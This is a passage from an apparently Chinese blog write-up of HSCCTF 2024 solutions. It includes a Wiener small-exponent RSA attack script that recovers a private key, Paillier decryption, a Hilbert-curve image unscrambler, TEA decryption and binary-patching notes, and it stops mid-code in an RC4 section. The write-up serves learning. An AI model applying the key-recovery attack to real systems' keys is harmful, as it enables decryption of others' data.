class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rational_to_contfrac</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="comment"># Converts a rational x/y fraction into a list of partial quotients [a0, ..., an]</span></span><br><span class="line">    a = x // y</span><br><span class="line">    pquotients = [a]</span><br><span class="line">    <span class="keyword">while</span> a * y != x:</span><br><span class="line">        x, y = y, x - a * y</span><br><span class="line">        a = x // y</span><br><span class="line">        pquotients.append(a)</span><br><span class="line">    <span class="keyword">return</span> pquotients</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convergents_from_contfrac</span>(<span class="params">frac</span>):</span><br><span class="line">    <span class="comment"># computes the list of convergents using the list of partial quotients</span></span><br><span class="line">    convs = [];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(frac)): convs.append(contfrac_to_rational(frac[<span class="number">0</span> : i]))</span><br><span class="line">    <span class="keyword">return</span> convs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contfrac_to_rational</span> (frac):</span><br><span class="line">    <span class="comment"># Converts a finite continued fraction [a0, ..., an] to an x/y rational.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(frac) == <span class="number">0</span>: <span class="keyword">return</span> (<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    num = frac[-<span class="number">1</span>]</span><br><span class="line">    denom = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">2</span>, -<span class="built_in">len</span>(frac) - <span class="number">1</span>, -<span class="number">1</span>): num, denom = frac[_] * num + denom, num</span><br><span class="line">    <span class="keyword">return</span> (num, denom)</span><br><span class="line"></span><br><span class="line">e = <span class="number">28590331496425613818981991777617535857151582651120346436859967760844419275658771430821058722393674433618893115968176611013590439492663850993790177381059077045197086133940118402088554088073121591402095323966107722485647643452801806511583327361664114727935171402256611877627071996643841223356362367747555753013</span></span><br><span class="line">n = <span class="number">82016816963574560365976489524199243050120748716806912567895093731022264392235286524041630435256965141365061465268083316572087612155218061280174438822024011254230300135794845491207820824129566975766207833561478897150955561714805950254000266078855648956964973181825856857736088834707915779351726709234357344729</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>: <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    g, x, y = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, y - (b // a) * x, x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, _ = egcd(a, m)</span><br><span class="line">    <span class="keyword">return</span> (x + m) % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isqrt</span>(<span class="params">n</span>):</span><br><span class="line">    x = n</span><br><span class="line">    y = (x + <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> y &lt; x:</span><br><span class="line">        x = y</span><br><span class="line">        y = (x + n // x) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_rsa</span>(<span class="params">e, n</span>):</span><br><span class="line">    frac = rational_to_contfrac(e, n)</span><br><span class="line">    convergents = convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if x*x - s*x + n = 0 has integer roots</span></span><br><span class="line">            D = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> D &gt;= <span class="number">0</span>:</span><br><span class="line">                sq = isqrt(D)</span><br><span class="line">                <span class="keyword">if</span> sq * sq == D <span class="keyword">and</span> (s + sq) % <span class="number">2</span> == <span class="number">0</span>: <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">d = crack_rsa(e, n)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11883451304899715537</span></span><br></pre></td></tr></table></figure><p>根据 $n,e,d$ 分解 $p,q$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">divide_pq</span>(<span class="params">e, d, n</span>):</span><br><span class="line">    k = e*d - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        g = random.randint(<span class="number">2</span>, n-<span class="number">1</span>)</span><br><span class="line">        t = k</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> t % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            t //= <span class="number">2</span></span><br><span class="line">            x = <span class="built_in">pow</span>(g, t, n)</span><br><span class="line">            <span class="keyword">if</span> x &gt; <span class="number">1</span> <span class="keyword">and</span> gmpy2.gcd(x-<span class="number">1</span>, n) &gt; <span class="number">1</span>:</span><br><span class="line">                p = gmpy2.gcd(x-<span class="number">1</span>, n)</span><br><span class="line">                <span class="keyword">return</span> (p, n//p)</span><br><span class="line">            </span><br><span class="line">e = <span class="number">28590331496425613818981991777617535857151582651120346436859967760844419275658771430821058722393674433618893115968176611013590439492663850993790177381059077045197086133940118402088554088073121591402095323966107722485647643452801806511583327361664114727935171402256611877627071996643841223356362367747555753013</span></span><br><span class="line">n = <span class="number">82016816963574560365976489524199243050120748716806912567895093731022264392235286524041630435256965141365061465268083316572087612155218061280174438822024011254230300135794845491207820824129566975766207833561478897150955561714805950254000266078855648956964973181825856857736088834707915779351726709234357344729</span></span><br><span class="line">c = <span class="number">0x1d1d98935d8bc395049b978b53ab72fc2c722f30b84bbf6c2bf3473320d040525bce59094840b229cf1fee0332c9dbcfc9cc07bf0841d2ec5f25b3f6a2868db433aca742d1e17a7b89f94412a77ea2f0ee3c30b53e250f77c44fd0e9c47bdfbfaa6dfe3f987409e9e6501962bf425cb686b570f922b843e30b4e96521c2dd296</span></span><br><span class="line">d=<span class="number">11883451304899715537</span></span><br><span class="line">p, q = divide_pq(e, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;q = <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = 8281403040977025531549820722276265064745565654568438822912387430707467937623490534629221470348100185977195507167386055422519226694536400000080279834237671</span></span><br><span class="line"><span class="comment"># q = 9903734494958037799680839753815171083006157728210189116724935884147895459864893196164405513869856559603118560765385175174916229249053756596318108626734399</span></span><br></pre></td></tr></table></figure><p>生成私钥文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">e=<span class="number">28590331496425613818981991777617535857151582651120346436859967760844419275658771430821058722393674433618893115968176611013590439492663850993790177381059077045197086133940118402088554088073121591402095323966107722485647643452801806511583327361664114727935171402256611877627071996643841223356362367747555753013</span></span><br><span class="line">n=<span class="number">82016816963574560365976489524199243050120748716806912567895093731022264392235286524041630435256965141365061465268083316572087612155218061280174438822024011254230300135794845491207820824129566975766207833561478897150955561714805950254000266078855648956964973181825856857736088834707915779351726709234357344729</span></span><br><span class="line">c=<span class="number">0x1d1d98935d8bc395049b978b53ab72fc2c722f30b84bbf6c2bf3473320d040525bce59094840b229cf1fee0332c9dbcfc9cc07bf0841d2ec5f25b3f6a2868db433aca742d1e17a7b89f94412a77ea2f0ee3c30b53e250f77c44fd0e9c47bdfbfaa6dfe3f987409e9e6501962bf425cb686b570f922b843e30b4e96521c2dd296</span></span><br><span class="line">d=<span class="number">11883451304899715537</span></span><br><span class="line">p = <span class="number">8281403040977025531549820722276265064745565654568438822912387430707467937623490534629221470348100185977195507167386055422519226694536400000080279834237671</span></span><br><span class="line">q = <span class="number">9903734494958037799680839753815171083006157728210189116724935884147895459864893196164405513869856559603118560765385175174916229249053756596318108626734399</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rsa_components = (n, e, d, p, q)</span><br><span class="line">myrsa = RSA.construct(rsa_components)</span><br><span class="line"></span><br><span class="line">private = <span class="built_in">open</span>(<span class="string">&#x27;private.pem&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">private.write(myrsa.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure><p>openssl解密：</p><p><code>openssl rsautl -decrypt -inkey private.pem -in output.txt</code></p><p>输出：<code>09C96E1A3ACC46E3C9F7603EB592FE4A</code></p><p>flag：<code>HSCCTF&#123;09C96E1A3ACC46E3C9F7603EB592FE4A&#125;</code></p><p>​    </p><h3 id="STAR-CHASING-DIARY"><a href="#STAR-CHASING-DIARY" class="headerlink" title="STAR_CHASING_DIARY"></a>STAR_CHASING_DIARY</h3><blockquote><p>crypto!图片?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># key.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q =&quot;</span>, q)</span><br><span class="line">n = p * q</span><br><span class="line">key = <span class="string">&#x27;********************&#x27;</span></span><br><span class="line">m = bytes_to_long(key.encode())</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; <span class="number">300</span></span><br><span class="line">r = randint(<span class="number">1</span>, n)</span><br><span class="line">c = (<span class="built_in">pow</span>(n + <span class="number">1</span>, m, n * n) * <span class="built_in">pow</span>(r, n, n * n)) % (n * n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = 7828612943367317778189697443061863547768704021648982642807960201410438190347546379219450386530108335470584219657007036386835647156694512102467911388214639</span></span><br><span class="line"><span class="comment"># q = 11560196429251786803557082533869761370530605728500211999842201987445533038949033226473164866960007192683170489064961432891988337343103657552186800680461299</span></span><br><span class="line"><span class="comment"># c = 768905250861905487717845092484035532140840941871031779930259407348955511757335716790249355464829607714399266689960353955065504221985891074636544161678177920296971444880997864168042745264256952808480926755620637239135808617643874771066244234690401223758004286234917537720362007827248701308605961814972773704288547887039586934111562590676930853945316673164146667949991176600280451163710564978897622310650541491271961315592017251211248379608602287809736613530069187936569470129814949302440734244885473716072898519354127964155042421376782226235081303957997587618278341829891036314980185040102049478608445519994654780162</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># task.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">小肖在学习的过程中,了解到了一种填充图片的算法,兴奋的她用它和RSA加密了偶像的照片,</span></span><br><span class="line"><span class="string">但是在传输的过程中丢失了一部分加密算法,你能帮她补全,并解出来偶像的照片吗?</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">n, x, y</span>):</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    m = <span class="number">1</span> &lt;&lt; (n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">j = <span class="number">128</span></span><br><span class="line">mm = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">257</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">257</span>):</span><br><span class="line">        mm.append(f(j, i, s) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.jpg&#x27;</span>)</span><br><span class="line">pixels = <span class="built_in">list</span>(img.getdata())</span><br><span class="line">data = [pixel <span class="keyword">for</span> pixel <span class="keyword">in</span> pixels]</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;key.png&#x27;</span>)</span><br><span class="line">pixels = <span class="built_in">list</span>(img.getdata())</span><br><span class="line">png_key = [pixel <span class="keyword">for</span> pixel <span class="keyword">in</span> pixels]</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0</span>] * <span class="number">65536</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    enc[i] = data[mm[i]]</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    enc[s] = enc[s] ^ png_key[s]</span><br><span class="line"></span><br><span class="line">image = Image.new(<span class="string">&#x27;L&#x27;</span>, (<span class="number">256</span>, <span class="number">256</span>))</span><br><span class="line">image.putdata(enc)</span><br><span class="line">image.save(<span class="string">&#x27;enc.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>先看 key.py，Paillier密码系统：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">7828612943367317778189697443061863547768704021648982642807960201410438190347546379219450386530108335470584219657007036386835647156694512102467911388214639</span></span><br><span class="line">q = <span class="number">11560196429251786803557082533869761370530605728500211999842201987445533038949033226473164866960007192683170489064961432891988337343103657552186800680461299</span></span><br><span class="line">c = <span class="number">768905250861905487717845092484035532140840941871031779930259407348955511757335716790249355464829607714399266689960353955065504221985891074636544161678177920296971444880997864168042745264256952808480926755620637239135808617643874771066244234690401223758004286234917537720362007827248701308605961814972773704288547887039586934111562590676930853945316673164146667949991176600280451163710564978897622310650541491271961315592017251211248379608602287809736613530069187936569470129814949302440734244885473716072898519354127964155042421376782226235081303957997587618278341829891036314980185040102049478608445519994654780162</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">L</span>(<span class="params">x,n</span>):</span><br><span class="line">    <span class="keyword">return</span> (x-<span class="number">1</span>)//n</span><br><span class="line"></span><br><span class="line">lamb = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">miu = inverse_mod(lamb,n)</span><br><span class="line">m = (L(<span class="built_in">pow</span>(c,lamb,n**<span class="number">2</span>),n)*miu)%n</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;HSCCTF&#123;this_is_a_fake_flag&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>用密码 <code>HSCCTF&#123;this_is_a_fake_flag&#125;</code> 解压得到 key.png。</p><p>再看 task.py，<code>f()</code> 函数不完整，根据提示是一种填充图片的算法，必定遍历0~65535共65536个下标值。</p><p>结合 <code>m = 1 &lt;&lt; (n - 1)</code> 和传入的 $n=128=\frac{256}{2}$，猜测为使用Hilbert曲线遍历 $256 \times 256$ 个值。</p><p>找到<a href="https://github.com/LynchrocketCourseLearning/2022Spring-CS208-Algorithm_Design_and_Analysis/blob/c9c992501063af9c7849c6eb95274964b719a0a1/lab/8/HilbertCurve.java">Hilbert曲线递归遍历的代码</a>，补充 <code>f()</code> 函数，还原flag.jpg：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">n, x, y</span>):</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    m = <span class="number">1</span> &lt;&lt; (n - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> x &lt;= m:</span><br><span class="line">        <span class="keyword">if</span> y &lt;= m:</span><br><span class="line">            <span class="keyword">return</span> f(n - <span class="number">1</span>, y, x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> m * m + f(n - <span class="number">1</span>, x, y - m)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> y &gt; m:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span> * m * m + f(n - <span class="number">1</span>, x - m, y - m)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">3</span> * m * m + f(n - <span class="number">1</span>, m + <span class="number">1</span> - y, m + <span class="number">1</span> - (x - m))</span><br><span class="line">        </span><br><span class="line">j = <span class="number">128</span></span><br><span class="line">mm = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">257</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">257</span>):</span><br><span class="line">        mm.append(f(j, i, s) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(mm)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;enc.jpg&#x27;</span>)</span><br><span class="line">pixels = <span class="built_in">list</span>(img.getdata())</span><br><span class="line">c = [pixel <span class="keyword">for</span> pixel <span class="keyword">in</span> pixels]</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;key.png&#x27;</span>)</span><br><span class="line">pixels = <span class="built_in">list</span>(img.getdata())</span><br><span class="line">png_key = [pixel <span class="keyword">for</span> pixel <span class="keyword">in</span> pixels]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    c[s] = c[s] ^ png_key[s]</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">65536</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    flag[mm[i]] = c[i]</span><br><span class="line"></span><br><span class="line">image = Image.new(<span class="string">&#x27;L&#x27;</span>, (<span class="number">256</span>, <span class="number">256</span>))</span><br><span class="line">image.putdata(flag)</span><br><span class="line">image.save(<span class="string">&#x27;flag.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到原始图片：</p><p><img src="/2024/03/11/match-HSCCTF-2024/flag.jpg" alt="flag"></p><p>flag：<code>HSCCTF&#123;oh!_you_c_yhhhh&#125;</code>。</p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h3><blockquote><p>将得到的flag改为HSCCTF。</p></blockquote><p>简答TEA加密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0x9E3779B9</span> * <span class="number">32</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">check_index = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>]</span><br><span class="line">check_enc = [<span class="number">0x05</span>,<span class="number">0xd7</span>,<span class="number">0xb8</span>,<span class="number">0x67</span>]</span><br><span class="line">c = [check_enc[check_index[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">c0 = bytes_to_long(<span class="built_in">bytes</span>(c)[::-<span class="number">1</span>])</span><br><span class="line">c1 = <span class="built_in">int</span>(<span class="string">&#x27;3c471c36&#x27;</span>[::-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">key = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">d = decrypt([c0,c1], key)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(d[<span class="number">0</span>])[<span class="number">2</span>:]+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">hex</span>(d[<span class="number">1</span>])[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment">#688ed036-a86a60ce</span></span><br></pre></td></tr></table></figure><p>flag：<code>flag&#123;688ed036-a86a60ce&#125;</code></p><p>​    </p><h3 id="ROULETTE"><a href="#ROULETTE" class="headerlink" title="ROULETTE"></a>ROULETTE</h3><blockquote><p>听说麻将连胜8局达到8本场就可以直接役满？！！<br>那么…这个游戏连胜8局难道会直接得到flag？！！！<br>（宫永照脸<br>flag形式同其他题目。</p></blockquote><p>patch <code>main_0()</code> 中的 <code>call sub_43E165</code> 为 <code>call sub_445990</code>，</p><p>再运行patch后的程序，直接输出结果 <code>HSCCTF&#123;H31L0_My_FR13ND!&#125;</code>。</p><p>​    </p><h3 id="THE-WOLF-SONG"><a href="#THE-WOLF-SONG" class="headerlink" title="THE_WOLF_SONG"></a>THE_WOLF_SONG</h3><blockquote><p>flag形式为:HSCCTF{this_is_an_example}<br>听电子音乐，享赛博人生。</p></blockquote><p>patch main函数的输出。进入 <code>sub_1400440F0()</code>，识别为RC4算法。</p><p>照代码逻辑动调逆一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 